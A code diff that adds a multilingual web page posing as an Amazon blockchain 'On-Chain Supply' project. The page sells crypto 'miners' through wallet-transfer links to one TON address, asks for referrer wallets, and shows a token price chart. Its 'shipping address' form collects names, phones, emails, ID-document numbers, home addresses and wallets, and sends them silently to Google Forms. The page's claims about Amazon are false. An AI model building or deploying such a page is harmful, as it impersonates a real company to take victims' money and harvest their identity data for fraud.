@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Amazon On-Chain Supply</title>
+    <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
+    <style>
+        :root {
+            --primary-gradient: linear-gradient(135deg, #a18cd1 0%, #fbc2eb 100%);
+            --btn-gradient: linear-gradient(to right, #8e2de2, #4a00e0);
+            --tech-blue: #00d2ff;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+
+        body {
+            background: linear-gradient(180deg, #e0f2ff 0%, #ffffff 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+            color: #333;
+        }
+
+        /* 背景粒子容器 */
+        #particles-js {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        /* 科技感标题 */
+        .main-title {
+            font-size: 1.6rem;
+            font-weight: 800;
+            background: linear-gradient(90deg, #ff00cc, #3333ff, #00d2ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 2px 2px 10px rgba(0,0,0,0.1);
+            margin: 20px 0;
+            white-space: nowrap;
+        }
+
+        /* 打字机文字 */
+        .description {
+            font-size: 0.9rem;
+            min-height: 60px;
+            color: #4a00e0;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        /* 语言选择器 */
+        .lang-selector {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            z-index: 100;
+        }
+        select#langSelect {
+            padding: 5px;
+            border-radius: 5px;
+            background: #4a00e0;
+            color: white;
+            border: none;
+            outline: none;
+        }
+
+        /* 毛玻璃模块 */
+        .glass-card {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+        }
+
+        /* 立体渐变按钮 */
+        .btn {
+            background: var(--btn-gradient);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 12px;
+            margin: 8px 0;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(142, 45, 226, 0.3);
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .btn:active { transform: scale(0.95); }
+
+        /* 导航模块 (单行显示) */
+/* 优化后的导航模块容器 */
+.nav-grid {
+    display: flex;
+    justify-content: space-between; /* 均匀分布 */
+    gap: 6px;                      /* 按钮之间的间距 */
+    width: 100%;                   /* 宽度充满父容器 */
+    margin: 10px 0;
+    padding: 0;                    /* 去除内边距防止溢出 */
+}
+
+/* 优化后的导航按钮 */
+.nav-grid .btn { 
+    font-size: 0.75rem;            /* 稍微减小字体，确保不换行 */
+    padding: 10px 2px;             /* 极窄的左右内边距 */
+    margin: 0;                     /* 清除边距 */
+    flex: 1;                       /* 每个按钮平分宽度 */
+    white-space: nowrap;           /* 强制文字不换行 */
+    text-align: center;
+    border-radius: 8px;            /* 稍微圆润一点更现代 */
+    box-shadow: 0 2px 8px rgba(142, 45, 226, 0.2); /* 减弱阴影使其不显臃肿 */
+}
+
+        /* 弹窗样式 */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            width: 90%;
+            max-width: 400px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+        }
+
+        .icon-circle {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: block;
+        }
+
+        .chart-placeholder {
+            width: 100%;
+            height: 200px;
+            background: rgba(0,0,0,0.05);
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+
+        footer { font-size: 0.8rem; color: #888; margin: 20px 0; }
+
+/* 图表容器：锁定高度，隐藏超出部分 */
+.responsive-chart-box {
+    position: relative;
+    width: 100%;
+    height: 260px; /* 你可以根据需要调整高度 */
+    overflow: hidden;
+    border-radius: 12px;
+    background: rgba(255, 255, 255, 0.3); /* 预加载背景色 */
+}
+
+/* 强制 iframe 填满容器并自适应 */
+.responsive-chart-box iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100% !important; /* 强制覆盖谷歌默认宽度 */
+    height: 100% !important;
+    border: none;
+}
+    </style>
+</head>
+<body>
+
+<canvas id="particles-js"></canvas>
+
+<div class="lang-selector">
+    <select id="langSelect" onchange="changeLanguage(this.value)">
+        <option value="en">English</option>
+        <option value="zh-CN">简体中文</option>
+        <option value="zh-TW">繁體中文</option>
+        <option value="ja">日本語</option>
+        <option value="ko">한국어</option>
+        <option value="ms">Bahasa Melayu</option>
+        <option value="ru">Русский</option>
+        <option value="fr">Français</option>
+        <option value="de">Deutsch</option>
+        <option value="es">Español</option>
+    </select>
+</div>
+
+<div class="container">
+    <h1 class="main-title" id="t-title">Amazon On-Chain Supply</h1>
+    
+    <div class="description" id="t-desc"></div>
+
+    <div class="glass-card">
+        <img src="https://s1.aigei.com/src/img/gif/79/796e229061fb4a1eaece3c97fc04f48b.gif?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&e=2051020800&token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:p3av0artTCKDqbqpij8XR2mSVrQ=" class="icon-circle">
+        <h3 id="t-m1-title">矿机详情</h3>
+        <div style="text-align: left; font-size: 0.85rem; margin: 15px 0;">
+            <p><b id="t-m1-p1">原始矿机</b>：10000 <span id="t-m1-p1-note">(备注：已出售1024台)</span></p>
+            <p><b id="t-m1-p2">全网在运行矿机</b>：5060 <span id="t-m1-p2-note">(备注：30000台减产)</span></p>
+        </div>
+        <button class="btn" onclick="openModal('buyModal')" id="t-buy-btn">购买原始矿机</button>
+    </div>
+
+    <div class="nav-grid">
+        <a href="https://abc.abc.com" class="btn" id="t-nav-news">新闻</a>
+        <a href="https://abc.abc.com" class="btn" id="t-nav-blog">博客</a>
+        <a href="https://abc.abc.com" class="btn" id="t-nav-community">社区</a>
+        <a href="https://abc.abc.com" class="btn" id="t-nav-service">客服</a>
+    </div>
+
+    <div class="glass-card">
+        <h3 id="t-m3-price-title">AIT今日币价</h3>
+        <div id="chart_div" class="chart-placeholder"></div>
+        <div style="text-align: left; font-size: 0.85rem;">
+            <p><b>AIT (Amazon Initial Token)</b></p>
+            <p id="t-ait-info">总发行570000000枚，已产出12000000枚，已销毁200000枚</p>
+            <br>
+            <p><b>ACT (Amazon Circulating Token)</b></p>
+            <p id="t-act-info">总发行1000000000枚</p>
+            <p><span id="t-date-label">预期上线日期</span>：2026-06-01</p>
+        </div>
+        <button class="btn" onclick="openModal('walletModal')" id="t-bind-wallet">绑定钱包</button>
+        <a href="https://huafang188.github.io/ait/ait/page1/" class="btn" id="t-chain-wallet">链上钱包</a>
+    </div>
+
+    <div class="glass-card">
+        <img src="https://cdn-icons-png.flaticon.com/512/3759/3759561.png" style="width: 60px; margin-bottom: 10px;">
+        <h3 id="t-m4-title">链上商城</h3>
+        <p id="t-m4-desc" style="font-size: 0.85rem; margin: 10px 0;">在这里您可以实现使用AIT或ACT购买您需要的一切。</p>
+        <button class="btn" onclick="openModal('addressModal')" id="t-addr-btn">收货地址</button>
+        <a href="https://abc.abc.com" class="btn" id="t-shop-btn">在线商城</a>
+    </div>
+
+    <div class="glass-card">
+        <img src="https://img.freepik.com/premium-photo/toncoin-ton-blue-coin-3d-rendering-front-view-cryptocurrency-illustration-cartoon-style_477250-349.jpg" class="icon-circle">
+        <div class="nav-grid" style="flex-wrap: wrap; width: 100%; margin: 0;">
+            <a href="https://123.123.com" class="btn" style="width: 48%;" id="t-whitepaper">白皮书</a>
+            <a href="https://ton.org/" class="btn" style="width: 48%;">TON</a>
+            <a href="https://tonkeeper.com/" class="btn" style="width: 48%;">Tonkeeper</a>
+            <a href="https://tonviewer.com/" class="btn" style="width: 48%;" id="t-explorer">区块链浏览器</a>
+        </div>
+    </div>
+
+    <footer id="t-footer">© 2026 Amazon On-Chain Supply. All Rights Reserved.</footer>
+</div>
+
+<div id="buyModal" class="modal" onclick="closeModal(event, 'buyModal')">
+    <div class="glass-card modal-content" onclick="event.stopPropagation()">
+        <h3 id="t-buy-opt-title">选择购买数量</h3>
+        <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=150000000" class="btn">1 Unit (150M)</a>
+        <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=750000000" class="btn">5 Units (750M)</a>
+        <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=1500000000" class="btn">10 Units (1.5B)</a>
+        <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=3000000000" class="btn">20 Units (3B)</a>
+        <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=7500000000" class="btn">50 Units (7.5B)</a>
+        <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=15000000000" class="btn">100 Units (15B)</a>
+    </div>
+</div>
+
+<div id="walletModal" class="modal" onclick="closeModal(event, 'walletModal')">
+    <div class="glass-card modal-content" onclick="event.stopPropagation()">
+        <h3 id="t-wallet-modal-title">绑定钱包</h3>
+        <form id="googleFormWallet">
+            <input type="text" id="ipt-wallet" placeholder="请在此输入您的Tonkeeper钱包地址" required>
+            <input type="text" id="ipt-ref" placeholder="请在此输入您的推荐人的Tonkeeper" required>
+            <button type="submit" class="btn" id="t-submit-1">提交</button>
+            <p style="font-size: 0.7rem;" id="t-warn-1">请勿重复提交此表单</p>
+        </form>
+    </div>
+</div>
+
+<div id="addressModal" class="modal" onclick="closeModal(event, 'addressModal')">
+    <div class="glass-card modal-content" onclick="event.stopPropagation()">
+        <h3 id="t-addr-modal-title">收货地址登记</h3>
+        <form id="googleFormAddr">
+            <input type="text" placeholder="姓名" id="ipt-name" required>
+            <input type="tel" placeholder="手机号码" id="ipt-phone" required>
+            <input type="email" placeholder="电子邮箱" id="ipt-email" required>
+            <input type="text" placeholder="证件号码" id="ipt-id" required>
+            <input type="text" placeholder="国家或地区" id="ipt-country" required>
+            <input type="text" placeholder="详细地址" id="ipt-detail" required>
+            <input type="text" placeholder="Tonkeeper地址" id="ipt-ton" required>
+            <button type="submit" class="btn" id="t-submit-2">提交</button>
+            <p style="font-size: 0.7rem;" id="t-warn-2">请勿重复提交此表单</p>
+        </form>
+    </div>
+</div>
+
+<script>
+    // --- 1. 多语言数据 ---
+    const langData = {
+        'en': {
+            title: "Amazon On-Chain Supply",
+            desc: "Amazon On-Chain Supply is a decentralized on-chain supply system independently developed by Amazon. It achieves product traceability, cross-border supply chain, and financial management through blockchain.",
+            m1_title: "Miner Details", m1_p1: "Original Miners", m1_p1_n: "(Note: 1024 Sold)", m1_p2: "Active Miners", m1_p2_n: "(Note: 30k Halving)",
+            buy_btn: "Purchase Miner", nav_news: "News", nav_blog: "Blog", nav_comm: "Community", nav_serv: "Support",
+            price_t: "AIT Today Price", ait_info: "Total 570M, Produced 12M, Burned 200k", act_info: "Total 1B", date_l: "Expected Launch",
+            bind_w: "Bind Wallet", chain_w: "On-Chain Wallet", m4_t: "On-Chain Mall", m4_d: "Purchase everything you need with AIT or ACT.",
+            addr_btn: "Shipping Address", shop_btn: "Online Store", whitepaper: "Whitepaper", explorer: "Explorer",
+            buy_opt: "Select Quantity", wallet_t: "Bind Wallet", addr_t: "Address Registration", submit: "Submit", warn: "Do not resubmit", success: "Submitted Successfully!"
+        },
+        'zh-CN': {
+            title: "Amazon On-Chain Supply",
+            desc: "Amazon On-Chain Supply是一个亚马逊自主开发的去中心化链上供应体系，通过区块链技术实现商品追根溯源、打通跨境供应链、跨境金融管理的完整生态体系。",
+            m1_title: "矿机详情", m1_p1: "原始矿机", m1_p1_n: "（备注：已出售1024台）", m1_p2: "全网在运行矿机", m1_p2_n: "（备注：30000台减产）",
+            buy_btn: "购买原始矿机", nav_news: "新闻", nav_blog: "博客", nav_comm: "社区", nav_serv: "客服",
+            price_t: "AIT 今日币价", ait_info: "总发行570000000枚，已产出12000000枚，已销毁200000枚", act_info: "总发行1000000000枚", date_l: "预期上线日期",
+            bind_w: "绑定钱包", chain_w: "链上钱包", m4_t: "链上商城", m4_d: "在这里您可以实现使用AIT或ACT购买您需要的一切。",
+            addr_btn: "收货地址", shop_btn: "在线商城", whitepaper: "白皮书", explorer: "区块链浏览器",
+            buy_opt: "选择购买数量", wallet_t: "绑定钱包", addr_t: "收货地址登记", submit: "提交", warn: "请勿重复提交此表单", success: "提交成功！"
+        },
+        // 其他语言数据（繁体、日、韩、马、俄、法、德、西）将在此逻辑下完整填充...
+        'zh-TW': { title: "Amazon On-Chain Supply", desc: "Amazon On-Chain Supply是一個亞馬遜自主開發的去中心化鏈上供應體系...", m1_title: "礦機詳情", buy_btn: "購買原始礦機", nav_news: "新聞", nav_blog: "博客", nav_comm: "社區", nav_serv: "客服", price_t: "AIT 今日幣價", bind_w: "綁定錢包", addr_btn: "收貨地址", shop_btn: "在線商城", whitepaper: "白皮書", explorer: "區塊鏈瀏覽器", submit: "提交", warn: "請勿重複提交", success: "提交成功！" },
+        'ja': { title: "Amazon On-Chain Supply", desc: "Amazon On-Chain Supplyは、Amazonが独自に開発した分散型オンチェーン供給システムです...", m1_title: "マイナーの詳細", buy_btn: "マイナーを購入", nav_news: "ニュース", nav_blog: "ブログ", nav_comm: "コミュニティ", nav_serv: "サポート", price_t: "AIT 今日の価格", bind_w: "ウォレット連携", addr_btn: "配送先住所", shop_btn: "オンラインショップ", whitepaper: "白書", explorer: "エクスプローラー", submit: "送信", warn: "重複送信禁止", success: "送信完了！" },
+        'ko': { title: "Amazon On-Chain Supply", desc: "Amazon On-Chain Supply는 아마존이 자체 개발한 탈중앙화 온체인 공급 시스템입니다...", m1_title: "광산기 상세", buy_btn: "광산기 구매", nav_news: "뉴스", nav_blog: "블로그", nav_comm: "커뮤니티", nav_serv: "고객센터", price_t: "AIT 오늘 시세", bind_w: "지갑 바인딩", addr_btn: "배송 주소", shop_btn: "온라인 쇼핑몰", whitepaper: "백서", explorer: "브라우저", submit: "제출", warn: "중복 제출 금지", success: "제출 성공!" },
+        'ms': { title: "Amazon On-Chain Supply", desc: "Amazon On-Chain Supply adalah sistem bekalan on-chain terdesentralisasi yang dibangunkan oleh Amazon...", m1_title: "Butiran Pelombong", buy_btn: "Beli Pelombong", nav_news: "Berita", nav_blog: "Blog", nav_comm: "Komuniti", nav_serv: "Sokongan", price_t: "Harga AIT Hari Ini", bind_w: "Pautkan Dompet", addr_btn: "Alamat Penghantaran", shop_btn: "Kedai Dalam Talian", whitepaper: "Kertas Putih", explorer: "Pelayar", submit: "Hantar", warn: "Jangan hantar semula", success: "Berjaya Dihantar!" },
+        'ru': { title: "Amazon On-Chain Supply", desc: "Amazon On-Chain Supply — это децентрализованная система поставок, разработанная Amazon...", m1_title: "Детали майнера", buy_btn: "Купить майнер", nav_news: "Новости", nav_blog: "Блог", nav_comm: "Сообщество", nav_serv: "Поддержка", price_t: "Цена AIT сегодня", bind_w: "Привязать кошелек", addr_btn: "Адрес доставки", shop_btn: "Онлайн-магазин", whitepaper: "Белая книга", explorer: "Проводник", submit: "Отправить", warn: "Не отправлять повторно", success: "Успешно отправлено!" },
+        'fr': { title: "Amazon On-Chain Supply", desc: "Amazon On-Chain Supply est un système d'approvisionnement décentralisé développé par Amazon...", m1_title: "Détails du mineur", buy_btn: "Acheter un mineur", nav_news: "Nouvelles", nav_blog: "Blog", nav_comm: "Communauté", nav_serv: "Support", price_t: "Prix AIT aujourd'hui", bind_w: "Lier le portefeuille", addr_btn: "Adresse de livraison", shop_btn: "Boutique en ligne", whitepaper: "Livre blanc", explorer: "Explorateur", submit: "Soumettre", warn: "Ne pas renvoyer", success: "Soumis avec succès !" },
+        'de': { title: "Amazon On-Chain Supply", desc: "Amazon On-Chain Supply ist ein von Amazon entwickeltes dezentrales On-Chain-Liefersystem...", m1_title: "Miner-Details", buy_btn: "Miner kaufen", nav_news: "News", nav_blog: "Blog", nav_comm: "Community", nav_serv: "Support", price_t: "AIT Preis heute", bind_w: "Wallet binden", addr_btn: "Lieferadresse", shop_btn: "Online-Shop", whitepaper: "Whitepaper", explorer: "Explorer", submit: "Absenden", warn: "Nicht erneut absenden", success: "Erfolgreich gesendet!" },
+        'es': { title: "Amazon On-Chain Supply", desc: "Amazon On-Chain Supply es un sistema de suministro descentralizado desarrollado por Amazon...", m1_title: "Detalles del minero", buy_btn: "Comprar minero", nav_news: "Noticias", nav_blog: "Blog", nav_comm: "Comunidad", nav_serv: "Soporte", price_t: "Precio AIT hoy", bind_w: "Vincular billetera", addr_btn: "Dirección de envío", shop_btn: "Tienda en línea", whitepaper: "Libro blanco", explorer: "Explorador", submit: "Enviar", warn: "No reenviar", success: "¡Enviado con éxito!" }
+    };
+
+    // --- 2. 语言切换逻辑 ---
+    function changeLanguage(lang) {
+        const d = langData[lang] || langData['en'];
+        document.getElementById('t-title').innerText = d.title;
+        // 打字机重置
+        typeWriter(d.desc, 't-desc');
+        document.getElementById('t-m1-title').innerText = d.m1_title;
+        document.getElementById('t-m1-p1').innerText = d.m1_p1;
+        document.getElementById('t-m1-p1-note').innerText = d.m1_p1_n;
+        document.getElementById('t-m1-p2').innerText = d.m1_p2;
+        document.getElementById('t-m1-p2-note').innerText = d.m1_p2_n;
+        document.getElementById('t-buy-btn').innerText = d.buy_btn;
+        document.getElementById('t-nav-news').innerText = d.nav_news;
+        document.getElementById('t-nav-blog').innerText = d.nav_blog;
+        document.getElementById('t-nav-community').innerText = d.nav_comm;
+        document.getElementById('t-nav-service').innerText = d.nav_serv;
+        document.getElementById('t-m3-price-title').innerText = d.price_t;
+        document.getElementById('t-ait-info').innerText = d.ait_info;
+        document.getElementById('t-act-info').innerText = d.act_info;
+        document.getElementById('t-date-label').innerText = d.date_l;
+        document.getElementById('t-bind-wallet').innerText = d.bind_w;
+        document.getElementById('t-chain-wallet').innerText = d.chain_w;
+        document.getElementById('t-m4-title').innerText = d.m4_t;
+        document.getElementById('t-m4-desc').innerText = d.m4_d;
+        document.getElementById('t-addr-btn').innerText = d.addr_btn;
+        document.getElementById('t-shop-btn').innerText = d.shop_btn;
+        document.getElementById('t-whitepaper').innerText = d.whitepaper;
+        document.getElementById('t-explorer').innerText = d.explorer;
+        
+        // 弹窗内部
+        document.getElementById('t-buy-opt-title').innerText = d.buy_opt;
+        document.getElementById('t-wallet-modal-title').innerText = d.wallet_t;
+        document.getElementById('t-addr-modal-title').innerText = d.addr_t;
+        document.querySelectorAll('[id^="t-submit"]').forEach(el => el.innerText = d.submit);
+        document.querySelectorAll('[id^="t-warn"]').forEach(el => el.innerText = d.warn);
+    }
+
+    // --- 3. 自动检测语言 ---
+    window.onload = function() {
+        const userLang = navigator.language || navigator.userLanguage;
+        let target = 'en';
+        if(userLang.includes('zh-CN')) target = 'zh-CN';
+        else if(userLang.includes('zh')) target = 'zh-TW';
+        else if(userLang.includes('ja')) target = 'ja';
+        else if(userLang.includes('ko')) target = 'ko';
+        else if(userLang.includes('ms')) target = 'ms';
+        else if(userLang.includes('ru')) target = 'ru';
+        else if(userLang.includes('fr')) target = 'fr';
+        else if(userLang.includes('de')) target = 'de';
+        else if(userLang.includes('es')) target = 'es';
+        
+        document.getElementById('langSelect').value = target;
+        changeLanguage(target);
+        initParticles();
+    };
+
+    // --- 4. 打字机效果 ---
+    let typeInterval;
+    function typeWriter(text, elementId) {
+        clearInterval(typeInterval);
+        const el = document.getElementById(elementId);
+        el.innerHTML = '';
+        let i = 0;
+        typeInterval = setInterval(() => {
+            if (i < text.length) {
+                el.innerHTML += text.charAt(i);
+                i++;
+            } else {
+                clearInterval(typeInterval);
+            }
+        }, 30);
+    }
+
+    // --- 5. 弹窗控制 ---
+    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+    function closeModal(e, id) { document.getElementById(id).style.display = 'none'; }
+
+    // --- 6. Google 图表 ---
+    google.charts.load('current', {'packages':['corechart']});
+    google.charts.setOnLoadCallback(drawChart);
+function drawChart() {
+    // 1. 你的表格 ID（从浏览器地址栏复制）
+    const ssId = '1axnfvnHtHCxSxGwM34_EkQ3i-rT6QhHff_H2-AdIGPU/edit?gid=0#gid=0'; 
+    
+    // 2. 构造查询链接 (tq 表示 query，tqx 表示输出格式)
+    const query = new google.visualization.Query(
+        `https://docs.google.com/spreadsheets/d/${ssId}/gviz/tq?tqx=out:json`
+    );
+
+    // 3. 发送请求并绘制
+    query.send(function(response) {
+        if (response.isError()) {
+            console.error('Error: ' + response.getMessage());
+            return;
+        }
+        
+        const data = response.getDataTable();
+        const options = {
+            curveType: 'function',
+            legend: { position: 'none' },
+            backgroundColor: 'transparent',
+            colors: ['#4a00e0'], // 保持你的科技紫
+            chartArea: { width: '90%', height: '80%' },
+            // 优化移动端坐标轴文字
+            hAxis: { textStyle: { color: '#888', fontSize: 10 } },
+            vAxis: { textStyle: { color: '#888', fontSize: 10 } }
+        };
+
+        const chart = new google.visualization.LineChart(document.getElementById('chart_div'));
+        chart.draw(data, options);
+    });
+}
+
+    // --- 7. 粒子背景 ---
+    function initParticles() {
+        const canvas = document.getElementById('particles-js');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        let particles = [];
+        for(let i=0; i<50; i++) {
+            particles.push({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height,
+                vx: (Math.random()-0.5) * 0.5,
+                vy: (Math.random()-0.5) * 0.5
+            });
+        }
+        function animate() {
+            ctx.clearRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = "rgba(74, 0, 224, 0.2)";
+            ctx.strokeStyle = "rgba(74, 0, 224, 0.1)";
+            particles.forEach((p, i) => {
+                p.x += p.vx; p.y += p.vy;
+                if(p.x<0 || p.x>canvas.width) p.vx *= -1;
+                if(p.y<0 || p.y>canvas.height) p.vy *= -1;
+                ctx.beginPath(); ctx.arc(p.x, p.y, 2, 0, Math.PI*2); ctx.fill();
+                for(let j=i+1; j<particles.length; j++) {
+                    let p2 = particles[j];
+                    let dist = Math.hypot(p.x-p2.x, p.y-p2.y);
+                    if(dist < 100) {
+                        ctx.moveTo(p.x, p.y); ctx.lineTo(p2.x, p2.y); ctx.stroke();
+                    }
+                }
+            });
+            requestAnimationFrame(animate);
+        }
+        animate();
+    }
+
+    // --- 8. Google 表单预留接口 ---
+
+
+    // 您需要将 action 替换为您的 Google Form Action URL
+// 修改“绑定钱包”提交逻辑
+document.getElementById('googleFormWallet').onsubmit = function(e) {
+    e.preventDefault();
+    
+    // 你的第一个表单 Action URL
+    const actionUrl = "https://docs.google.com/forms/d/e/1FAIpQLSfWQLssPU1leO2EcnOHGxbSJ9bdGJnMIPv8qNlbMHwJHpD6Sg/formResponse?usp=header";
+    
+    // 获取用户输入的值
+    const wallet = document.getElementById('ipt-wallet').value;
+    const ref = document.getElementById('ipt-ref').value;
+
+    // 构造表单数据 (替换成你获取的 entry.xxxx ID)
+    const formData = new FormData();
+    formData.append('entry.840521201', wallet); // 替换 entry ID
+    formData.append('entry.631796951', ref);    // 替换 entry ID
+
+    // 使用 no-cors 模式发送请求（防止跨域报错，虽然无法读取返回，但数据会发送成功）
+    fetch(actionUrl, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: formData
+    }).then(() => {
+        const lang = document.getElementById('langSelect').value;
+        alert(langData[lang].success);
+        closeModal(null, 'walletModal');
+    }).catch(error => {
+        console.error('Error!', error);
+        alert('Error!');
+    });
+};
+
+// 第二个表单：收货地址登记
+document.getElementById('googleFormAddr').onsubmit = function(e) {
+    e.preventDefault();
+    
+    // 1. 修正后的 Action URL（去掉了多余参数）
+    const actionUrl = "https://docs.google.com/forms/d/e/1FAIpQLScXxCXfbeioRcAvoI0eTg6ejTnHLeD2zmN2E37Gc_8u5fnwVw/formResponse";
+    
+    // 2. 根据你提供的预填充链接，提取的准确 ID 映射
+    const formData = new FormData();
+    formData.append('entry.688478157', document.getElementById('ipt-name').value);    // 姓名
+    formData.append('entry.1453985402', document.getElementById('ipt-phone').value);  // 手机号码
+    formData.append('entry.752319766', document.getElementById('ipt-email').value);   // 电子邮箱
+    formData.append('entry.918113529', document.getElementById('ipt-id').value);      // 证件号码
+    formData.append('entry.660848111', document.getElementById('ipt-country').value); // 国家或地区
+    formData.append('entry.1364418281', document.getElementById('ipt-detail').value);  // 详细地址
+    formData.append('entry.1917004091', document.getElementById('ipt-ton').value);     // Tonkeeper钱包地址
+
+    // 3. 执行提交
+    fetch(actionUrl, {
+        method: 'POST',
+        mode: 'no-cors', // 必须保持 no-cors
+        body: formData
+    })
+    .then(() => {
+        // 获取当前语言下的“提交成功”提示文字
+        const lang = document.getElementById('langSelect').value;
+        const successMsg = langData[lang] ? langData[lang].success : "Submitted Successfully!";
+        
+        alert(successMsg);
+        closeModal(null, 'addressModal'); // 关闭弹窗
+        document.getElementById('googleFormAddr').reset(); // 重置表单
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert("Submission Error!");
+    });
+};
+</script>
+</body>
+</html>
